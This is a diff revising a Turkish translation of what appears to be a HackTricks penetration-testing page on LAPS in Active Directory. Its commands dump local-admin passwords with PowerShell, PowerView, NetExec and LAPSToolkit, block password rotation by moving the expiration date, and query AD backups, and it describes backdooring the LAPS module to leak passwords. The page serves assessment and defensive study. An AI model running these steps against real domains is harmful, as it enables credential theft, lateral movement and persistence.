@@ -5,36 +5,36 @@
 
 ## Temel Bilgiler
 
-Bir değerlendirme sırasında karşılaşabileceğiniz şu anda **2 LAPS çeşidi** vardır:
+Bir assessment sırasında karşılaşabileceğiniz şu anda **2 LAPS türü** vardır:
 
-- **Legacy Microsoft LAPS**: yerel administrator password'ünü **`ms-Mcs-AdmPwd`** içinde ve expiration time'ı **`ms-Mcs-AdmPwdExpirationTime`** içinde saklar.
-- **Windows LAPS** (April 2023 güncellemelerinden beri Windows içine gömülü): hâlâ legacy mode'u emüle edebilir, ancak native mode'da **`msLAPS-*`** attribute'larını kullanır, **password encryption**, **password history** ve domain controller'lar için **DSRM password backup** desteği sunar.
+- **Legacy Microsoft LAPS**: yerel administrator password bilgisini **`ms-Mcs-AdmPwd`** ve expiration time bilgisini **`ms-Mcs-AdmPwdExpirationTime`** içinde depolar.
+- **Windows LAPS** (April 2023 updates'ten beri Windows'a dahildir): legacy mode'u hâlâ emulate edebilir, ancak native mode'da **`msLAPS-*`** attribute'larını kullanır, **password encryption**, **password history** ve domain controller'lar için **DSRM password backup** desteği sunar.
 
-LAPS, **local administrator password'lerini** yönetmek için tasarlanmıştır; bunları domain'e joined bilgisayarlarda **unique, randomized ve frequently changed** hale getirir. Bu attribute'ları okuyabiliyorsanız, genellikle etkilenen host'a **local admin olarak pivot** yapabilirsiniz. Birçok environment'ta ilginç olan kısım yalnızca password'ün kendisini okumak değil, aynı zamanda password attribute'larına erişim yetkisi **kimlere delegations edildiğini** bulmaktır.
+LAPS, **local administrator password'larını** yönetmek için tasarlanmıştır; bu password'ları domain-joined computer'larda **unique, randomized ve sık sık değiştirilen** hâle getirir. Bu attribute'ları okuyabiliyorsanız, genellikle etkilenen host'a **local admin** olarak **pivot** edebilirsiniz. Birçok environment'ta ilgi çekici kısım yalnızca password'un kendisini okumak değil, aynı zamanda password attribute'larına erişimin **kime delegate edildiğini** bulmaktır.
 
-### Legacy Microsoft LAPS attributes
+### Legacy Microsoft LAPS attribute'ları
 
-Domain'in computer object'lerinde, legacy Microsoft LAPS implementasyonu iki attribute'un eklenmesine yol açar:
+Domain'deki computer object'lerinde, Legacy Microsoft LAPS implementation'ı iki attribute'un eklenmesiyle sonuçlanır:<sup>[[1]](#references)</sup>
 
 - **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
 - **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**
 
-### Windows LAPS attributes
+### Windows LAPS attribute'ları
 
-Native Windows LAPS, computer object'lerine birkaç yeni attribute ekler:
+Native Windows LAPS, computer object'lerine birkaç yeni attribute ekler:<sup>[[2]](#references)</sup>
 
-- **`msLAPS-Password`**: encryption etkin değilken JSON olarak saklanan clear-text password blob'u
+- **`msLAPS-Password`**: encryption etkin değilken JSON olarak depolanan clear-text password blob'u
 - **`msLAPS-PasswordExpirationTime`**: planlanan expiration time
 - **`msLAPS-EncryptedPassword`**: encrypted current password
 - **`msLAPS-EncryptedPasswordHistory`**: encrypted password history
 - **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: domain controller'lar için encrypted DSRM password verisi
-- **`msLAPS-CurrentPasswordVersion`**: daha yeni rollback-detection mantığı tarafından kullanılan GUID-based version tracking (Windows Server 2025 forest schema)
+- **`msLAPS-CurrentPasswordVersion`**: daha yeni rollback-detection logic tarafından kullanılan GUID-based version tracking (Windows Server 2025 forest schema)
 
-**`msLAPS-Password`** okunabiliyorsa, değer account name, update time ve clear-text password içeren bir JSON object'tir; örneğin:
+**`msLAPS-Password`** okunabilir olduğunda, değer account name, update time ve clear-text password içeren bir JSON object'tir; örneğin:<sup>[[2]](#references)</sup>
 ```json
 {"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
 ```
-### Aktif olup olmadığını kontrol et
+### Etkinleştirilip etkinleştirilmediğini kontrol edin
 ```bash
 # Legacy Microsoft LAPS policy
 reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
@@ -60,11 +60,11 @@ select DnsHostname
 ```
 ## LAPS Password Access
 
-`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` adresinden **raw LAPS policy** dosyasını indirebilir ve ardından bu dosyayı insan tarafından okunabilir formata dönüştürmek için [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) paketinden **`Parse-PolFile`** kullanabilirsiniz.
+**Ham LAPS policy**'sini `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` konumundan **indirebilir**, ardından bu dosyayı insan tarafından okunabilir bir biçime dönüştürmek için [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) paketindeki **`Parse-PolFile`**'ı kullanabilirsiniz.
 
-### Legacy Microsoft LAPS PowerShell cmdlets
+### Eski Microsoft LAPS PowerShell cmdlet'leri
 
-Eğer legacy LAPS module yüklüyse, genellikle aşağıdaki cmdlets kullanılabilir:
+Eski LAPS modülü yüklüyse aşağıdaki cmdlet'ler genellikle kullanılabilir:
 ```bash
 Get-Command *AdmPwd*
 
@@ -85,9 +85,9 @@ Find-AdmPwdExtendedRights -Identity Workstations | fl
 # Read the password
 Get-AdmPwdPassword -ComputerName wkstn-2 | fl
 ```
-### Windows LAPS PowerShell cmdlets
+### Windows LAPS PowerShell cmdlet'leri
 
-Native Windows LAPS, yeni bir PowerShell module ve yeni cmdlets ile gelir:
+Native Windows LAPS, yeni bir PowerShell modülü ve yeni cmdlet'lerle birlikte gelir:
 ```bash
 Get-Command *Laps*
 
@@ -107,19 +107,19 @@ Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText
 $cred = Get-Credential CONTOSO\LAPSDecryptor
 Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
 ```
-Burada birkaç operasyonel detay önemlidir:
+Burada birkaç operasyonel ayrıntı önemlidir:<sup>[[3]](#references)</sup>
 
-- **`Get-LapsADPassword`** otomatik olarak **legacy LAPS**, **clear-text Windows LAPS** ve **encrypted Windows LAPS** işlemlerini yapar.
-- Eğer password encrypted ise ve siz onu **read** edebiliyor ama **decrypt** edemiyorsanız, cmdlet **clear-text password**’ü döndüremese bile **`Source`**, **`DecryptionStatus`** ve **`AuthorizedDecryptor`** gibi metadata bilgilerini döndürür.
-- **encrypted Windows LAPS** içinde **read permission** ve **decrypt permission** **farklı kontrollerdir**. OU / object read access sahibi olmak, otomatik olarak **`msLAPS-EncryptedPassword`** decrypt edebileceğiniz anlamına gelmez.
-- **Password history**, yalnızca **Windows LAPS encryption** etkinleştirildiğinde kullanılabilir.
-- Domain controller’larda döndürülen source **`EncryptedDSRMPassword`** olabilir.
+- **`Get-LapsADPassword`**, **legacy LAPS**, **clear-text Windows LAPS** ve **encrypted Windows LAPS** işlemlerini otomatik olarak destekler.
+- Parola encrypted durumdaysa ve onu **read** edip **decrypt** edemiyorsanız, cmdlet clear-text parolayı döndüremese bile **`Source`**, **`DecryptionStatus`** ve **`AuthorizedDecryptor`** gibi metadata bilgilerini döndürür.
+- **encrypted Windows LAPS** içinde **read permission** ve **decrypt permission** birbirinden **farklı kontrollerdir**. OU / object read access sahibi olmak, **`msLAPS-EncryptedPassword`** değerini otomatik olarak decrypt edebileceğiniz anlamına gelmez.
+- **Password history** yalnızca **Windows LAPS encryption** etkinleştirildiğinde kullanılabilir.
+- Domain controller'larda döndürülen source **`EncryptedDSRMPassword`** olabilir.
 
-Bu, bir assessment sırasında faydalıdır çünkü **`AuthorizedDecryptor`** alanı size blob’un **hangi user veya group** için encrypted edildiğini söyler ve çoğu zaman başarısız bir password read denemesini yeni bir privilege-escalation hedefine dönüştürür.
+Bu, assessment sırasında kullanışlıdır; çünkü **`AuthorizedDecryptor`** alanı blob'un **hangi kullanıcı veya grup için encrypted** edildiğini gösterir ve başarısız bir password read işlemini çoğu zaman yeni bir privilege-escalation hedefine dönüştürür.
 
 ### PowerView / LDAP
 
-**PowerView** ayrıca **kim password’u read edebilir ve onu read etmek için nasıl kullanılacağını** bulmak için de kullanılabilir:
+**PowerView**, **password'u kimin read edebildiğini bulmak ve password'u read etmek** için de kullanılabilir:
 ```bash
 # Legacy Microsoft LAPS: find principals with rights over the OU
 Find-AdmPwdExtendedRights -Identity Workstations | fl
@@ -130,18 +130,18 @@ Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpira
 # Native Windows LAPS clear-text mode
 Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
 ```
-Eğer **`msLAPS-Password`** okunabiliyorsa, döndürülen JSON’u ayrıştırın ve parola için **`p`** ile yönetilen yerel admin hesabı adı için **`n`** alanını çıkarın.
+**`msLAPS-Password`** okunabiliyorsa, döndürülen JSON'u ayrıştırın ve parola için **`p`**, yönetilen yerel yönetici hesabı adı için **`n`** değerini çıkarın.
 ```bash
 # Extract both the password and the real managed account name
 $laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
 $laps.n
 $laps.p
 ```
-Bu **`n`** alanı, daha yeni kurulumlarda önemlidir çünkü **Windows LAPS automatic account management** yerleşik **`Administrator`** yerine bir **custom account** hedefleyebilir ve daha yeni **Windows 11 24H2 / Windows Server 2025** sistemleri bu hesap adını hatta **randomize** edebilir.
+Bu **`n`** alanı, daha yeni deployments için önemlidir; çünkü **Windows LAPS automatic account management**, yerleşik **`Administrator`** yerine bir **custom account** hedefleyebilir ve daha yeni **Windows 11 24H2 / Windows Server 2025** sistemleri bu account adını **randomize** bile edebilir.<sup>[[4]](#references)</sup>
 
 ### Linux / remote tooling
 
-Modern tooling, hem legacy Microsoft LAPS hem de Windows LAPS destekler.
+Modern tooling hem legacy Microsoft LAPS hem de Windows LAPS'ı destekler.
 ```bash
 # NetExec / CrackMapExec lineage: dump LAPS values over LDAP
 nxc ldap 10.10.10.10 -u user -p password -M laps
@@ -162,23 +162,23 @@ get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
 ```
 Notlar:
 
-- Son **NetExec** sürümleri **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** ve **`msLAPS-EncryptedPassword`** destekler.
-- **`pyLAPS`**, Linux üzerinden **legacy Microsoft LAPS** için hâlâ kullanışlıdır, ancak yalnızca **`ms-Mcs-AdmPwd`** hedefler.
-- **`LAPS4LINUX`**, **`dpapi-ng`** tabanlı tooling ve yeni **NetExec** iş akışları gibi daha yeni platformlar arası araçlar, Windows dışı hostlardan **native Windows LAPS** ile de başa çıkabilir.
-- Ortam **encrypted Windows LAPS** kullanıyorsa, basit bir LDAP read yeterli değildir; ayrıca **authorized decryptor** olmanız gerekir (veya offline domain DPAPI-NG root key material gibi eşdeğer decryption material).
-- **Windows 11 24H2 / Windows Server 2025** üzerinde, yönetilen local admin'in her zaman **`Administrator`** olduğunu varsaymayın. Automatic account management özel bir account oluşturabilir ve isteğe bağlı olarak adını randomize edebilir; bu yüzden **`--laps`** kullanmadan önce ölçekli kullanımda account adını önce **`n`** / **`Account`** üzerinden keşfedin.
+- Güncel **NetExec** derlemeleri **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** ve **`msLAPS-EncryptedPassword`** özelliklerini destekler.
+- **`pyLAPS`**, Linux üzerinden **legacy Microsoft LAPS** için hâlâ kullanışlıdır, ancak yalnızca **`ms-Mcs-AdmPwd`** hedeflenir.
+- **`LAPS4LINUX`**, **`dpapi-ng`** tabanlı araçlar ve güncel **NetExec** workflow'ları gibi daha yeni cross-platform araçlar, **native Windows LAPS**'ı Windows dışı host'lardan da işleyebilir.
+- Ortamda **encrypted Windows LAPS** kullanılıyorsa basit bir LDAP okuması yeterli değildir; ayrıca **authorized decryptor** (veya offline domain DPAPI-NG root key material gibi eşdeğer decryption material) olmanız gerekir.<sup>[[5]](#references)</sup>
+- **Windows 11 24H2 / Windows Server 2025** üzerinde, yönetilen local admin hesabının her zaman **`Administrator`** olduğunu varsaymayın. Automatic account management, özel bir hesap oluşturabilir ve isteğe bağlı olarak adını randomize edebilir; bu nedenle geniş ölçekte **`--laps`** kullanmadan önce hesap adını **`n`** / **`Account`** üzerinden keşfedin.<sup>[[4]](#references)</sup>
 
 ### Directory synchronization abuse
 
-Direct read access yerine her computer object üzerinde domain-level **directory synchronization** rights'ınız varsa, LAPS yine de ilginç olabilir.
+Her computer object üzerinde doğrudan read access yerine domain-level **directory synchronization** haklarına sahipseniz, LAPS yine de ilgi çekici olabilir.
 
-**`DS-Replication-Get-Changes`** ile **`DS-Replication-Get-Changes-In-Filtered-Set`** veya **`DS-Replication-Get-Changes-All`** birleşimi, legacy **`ms-Mcs-AdmPwd`** gibi confidential / RODC-filtered attributes'ı synchronize etmek için kullanılabilir. BloodHound bunu **`SyncLAPSPassword`** olarak modeller. Replication-rights arka planı için [DCSync](dcsync.md) kontrol edin.
+**`DS-Replication-Get-Changes`** ile **`DS-Replication-Get-Changes-In-Filtered-Set`** veya **`DS-Replication-Get-Changes-All`** kombinasyonu, legacy **`ms-Mcs-AdmPwd`** gibi **confidential / RODC-filtered** attribute'ları synchronize etmek için kullanılabilir. BloodHound bunu **`SyncLAPSPassword`** olarak modeller. Replication-rights arka planı için [DCSync](dcsync.md) sayfasına bakın.
 
 ## LAPSToolkit
 
-[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit), birkaç function ile LAPS enumeration'ını kolaylaştırır.\
-Bunlardan biri, **LAPS enabled** olan tüm computers için **`ExtendedRights`** parse etmektir. Bu, özellikle protected groups içindeki users olan, **LAPS passwords okumak için delegated edilmiş** **groups**'u gösterir.\
-Bir domain'e bir computer **join etmiş** bir **account**, o host üzerinde `All Extended Rights` alır ve bu right, **account**'a **passwords okuma** yeteneği verir. Enumeration, bir host üzerindeki LAPS password'unu okuyabilen bir user account gösterebilir. Bu, LAPS passwords okuyabilen belirli AD users'ı **target** almamıza yardımcı olabilir.
+[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit), çeşitli işlevlerle LAPS enumeration'ını kolaylaştırır.<sup>[[6]](#references)</sup>\
+Bunlardan biri, **LAPS etkinleştirilmiş tüm computer'lar için** **`ExtendedRights`** parsing işlemidir. Bu işlem, özellikle **LAPS password'larını okumak üzere delegate edilmiş grupları** gösterir; bunlar çoğunlukla protected group'ların üyeleridir.\
+Bir **account**, bir computer'ı domain'e **join ettiğinde**, bu host üzerinde `All Extended Rights` alır ve bu hak, **account**'a **password'ları okuma** yeteneği verir. Enumeration, bir host üzerindeki LAPS password'ını okuyabilen bir user account gösterebilir. Bu, LAPS password'larını okuyabilen **belirli AD user'larını hedeflememize** yardımcı olabilir.
 ```bash
 # Get groups that can read passwords
 Find-LAPSDelegatedGroups
@@ -202,9 +202,9 @@ ComputerName                Password       Expiration
 ------------                --------       ----------
 DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
 ```
-## NetExec / CrackMapExec ile LAPS Parolalarını Dökme
+## NetExec / CrackMapExec ile LAPS Passwords Dumping
 
-Eğer etkileşimli bir PowerShell'iniz yoksa, bu yetkiyi LDAP üzerinden uzaktan kötüye kullanabilirsiniz:
+Etkileşimli bir PowerShell'iniz yoksa, bu ayrıcalığı LDAP üzerinden uzaktan abuse edebilirsiniz:
 ```bash
 # Legacy syntax still widely seen in writeups
 crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
@@ -212,9 +212,9 @@ crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
 # Current project name / syntax
 nxc ldap 10.10.10.10 -u user -p password -M laps
 ```
-Bu, kullanıcının okuyabildiği tüm LAPS secrets değerlerini dump eder ve farklı bir local administrator password ile yatay hareket etmenize olanak tanır.
+Bu, kullanıcının okuyabildiği tüm LAPS sırlarını döker ve farklı bir local administrator password ile lateral movement yapmanıza olanak tanır.
 
-## LAPS Password Kullanma
+## LAPS Password Kullanımı
 ```bash
 xfreerdp /v:192.168.1.1:3389 /u:Administrator
 Password: 2Z@Ae)7!{9#Cq
@@ -226,7 +226,7 @@ Password: 2Z@Ae)7!{9#Cq
 
 ### Son Kullanma Tarihi
 
-Admin olduktan sonra, **parolaları elde etmek** ve bir makinenin **parolasını güncellemesini** engellemek için **son kullanma tarihini geleceğe ayarlamak** mümkündür.
+Admin olduktan sonra, **parolaları elde etmek** ve **son kullanma tarihini gelecekteki bir tarihe ayarlayarak** bir makinenin **parolasını güncellemesini** **engellemek** mümkündür.
 
 Legacy Microsoft LAPS:
 ```bash
@@ -237,7 +237,7 @@ Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
 ## SYSTEM on the computer is needed
 Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
 ```
-Native Windows LAPS bunun yerine **`msLAPS-PasswordExpirationTime`** kullanır:
+Yerleşik Windows LAPS bunun yerine **`msLAPS-PasswordExpirationTime`** kullanır:
 ```bash
 # Read the current expiration timestamp
 Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime
@@ -246,23 +246,23 @@ Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime
 Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
 ```
 > [!WARNING]
-> Parola yine de bir **admin** **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`** kullandığında, ya da **Do not allow password expiration time longer than required by policy** etkinleştirildiğinde döner.
+> Bir **admin** **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`** kullandığında veya **Do not allow password expiration time longer than required by policy** etkinleştirildiğinde parola yine de rotate olur.
 
-### Yeni Windows LAPS üzerinde snapshot rollback uyarısı
+### Daha yeni Windows LAPS sürümlerinde snapshot rollback uyarısı
 
-Eski snapshot / image rollback hileleri, yeni **Windows LAPS** dağıtımlarına karşı **daha az güvenilir**. **Windows 11 24H2 / Windows Server 2025** üzerinde, forest schema **`msLAPS-CurrentPasswordVersion`** (**Windows Server 2025 forest schema**) içeriyorsa, client yerel olarak cache’lenmiş bir GUID’i AD’de depolanan değerle karşılaştırır ve bir rollback **torn state** oluşturduğunda **parolayı hemen döndürür**.
+Eski snapshot / image rollback yöntemleri, güncel **Windows LAPS** kurulumlarına karşı **daha az güvenilirdir**. **Windows 11 24H2 / Windows Server 2025** üzerinde, forest schema **`msLAPS-CurrentPasswordVersion`** (**Windows Server 2025 forest schema**) içeriyorsa client, yerel olarak cache'lenmiş GUID'yi AD'de depolanan değerle karşılaştırır ve rollback bir **torn state** oluşturduğunda parolayı **hemen rotate eder**.
 
-Pratikte bu, snapshot tabanlı persistence veya eski, bilinen bir local admin parolasını geri getirme girişimlerinin, bir sonraki normal expiration’a kadar hayatta kalmak yerine hızla boşa çıkabileceği anlamına gelir.
+Pratikte bu, snapshot tabanlı persistence yöntemlerinin veya daha önce bilinen bir local admin parolasını yeniden canlandırma girişimlerinin bir sonraki normal expiration zamanına kadar dayanmak yerine hızlıca etkisiz hale gelebileceği anlamına gelir.<sup>[[2]](#references)</sup>
 
-Bu koruma yalnızca **AD-backed Windows LAPS** için geçerlidir ve geri alınan makinenin yeniden **AD ile authenticate** olabilmesine hâlâ bağlıdır. Makine artık AD ile konuşamıyorsa, **password history** veya **AD backup access** yine işi kurtarabilir.
+Bu koruma yalnızca **AD-backed Windows LAPS** için geçerlidir ve geri döndürülen makinenin yeniden **AD'ye authenticate olabilmesine** bağlıdır. Makine artık AD ile iletişim kuramıyorsa **password history** veya **AD backup access** yine işe yarayabilir.
 
-### Automatic account management kurcalama uyarısı
+### Automatic account management için tamper uyarısı
 
-**automatic account management** etkin olduğunda, Windows LAPS yönetilen local admin account’un yaşam döngüsünü yönetir. Bu account’u yeniden adlandırmaya, yeniden yapılandırmaya veya başka şekilde kurcalamaya yönelik beklenmedik girişimler **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`** ile reddedilebilir; bu yüzden yönetilen LAPS account’unu sessizce değiştirmeye dayanan persistence, yeni endpoint’lerde daha az güvenilirdir.
+**automatic account management** etkin olduğunda Windows LAPS, yönetilen local admin hesabının yaşam döngüsünü kontrol eder. Bu hesap üzerinde beklenmeyen rename, reconfigure veya başka türde tamper girişimleri **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`** ile reddedilebilir; bu nedenle yönetilen LAPS hesabını sessizce değiştirmeye dayanan persistence yöntemleri daha yeni endpoint'lerde daha az güvenilirdir.<sup>[[4]](#references)</sup>
 
-### AD backup’larından historical passwords kurtarma
+### AD backup'larından historical password'ları kurtarma
 
-**Windows LAPS encryption + password history** etkin olduğunda, bağlanmış AD backup’ları ek bir secrets kaynağı olabilir. Bağlanmış bir AD snapshot’a erişebiliyor ve **recovery mode** kullanabiliyorsanız, canlı bir DC ile konuşmadan daha eski saklanmış parolaları sorgulayabilirsiniz.
+**Windows LAPS encryption + password history** etkin olduğunda, mount edilmiş AD backup'ları ek bir secret kaynağı haline gelebilir. Mount edilmiş bir AD snapshot'ına erişebiliyor ve **recovery mode** kullanabiliyorsanız, canlı bir DC ile iletişim kurmadan daha önce depolanmış parolaları sorgulayabilirsiniz.<sup>[[3]](#references)</sup>
 ```bash
 # Query a mounted AD snapshot on port 50000
 Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode
@@ -270,21 +270,21 @@ Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode
 # Historical entries if history is enabled
 Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
 ```
-Bu çoğunlukla **AD backup theft**, **offline forensics abuse** veya **disaster-recovery media access** sırasında geçerlidir.
+This is mostly relevant during **AD backup theft**, **offline forensics abuse** veya **disaster-recovery media access** sırasında.
 
 ### Backdoor
 
-Legacy Microsoft LAPS için orijinal source code [burada](https://github.com/GreyCorbel/admpwd) bulunabilir, bu nedenle koda bir backdoor eklemek mümkündür (örneğin `Main/AdmPwd.PS/Main.cs` içindeki `Get-AdmPwdPassword` methodunun içine) ve bu kod bir şekilde **yeni passwords sızdırabilir veya onları bir yerde saklayabilir**.
+Legacy Microsoft LAPS için orijinal kaynak kodu [burada](https://github.com/GreyCorbel/admpwd) bulunabilir; bu nedenle koda (örneğin `Main/AdmPwd.PS/Main.cs` içindeki `Get-AdmPwdPassword` method'una) bir backdoor yerleştirmek ve bir şekilde **yeni parolaları exfiltrate etmek veya bir yerde depolamak** mümkündür.
 
-Ardından, yeni `AdmPwd.PS.dll` dosyasını compile edip makineye `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` yoluna upload edin (ve modification time'ını değiştirin).
+Ardından yeni `AdmPwd.PS.dll` dosyasını compile edin ve makineye `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` konumuna upload edin (ve modification time'ı değiştirin).
 
 ## References
 
-- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
-- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
-- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
-- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
-- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)
-
+- [1] [Introduction to Microsoft LAPS – Local Administrator Password Solution](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
+- [2] [Windows LAPS schema and rights extensions for Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
+- [3] [Get started with Windows LAPS and Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
+- [4] [Windows LAPS account management modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
+- [5] [LAPS 2.0 Internals - XPN Infosec Blog](https://blog.xpnsec.com/lapsv2-internals/)
+- [6] [LAPSToolkit - leoloobeek](https://github.com/leoloobeek/LAPSToolkit)
 
 {{#include ../../banners/hacktricks-training.md}}
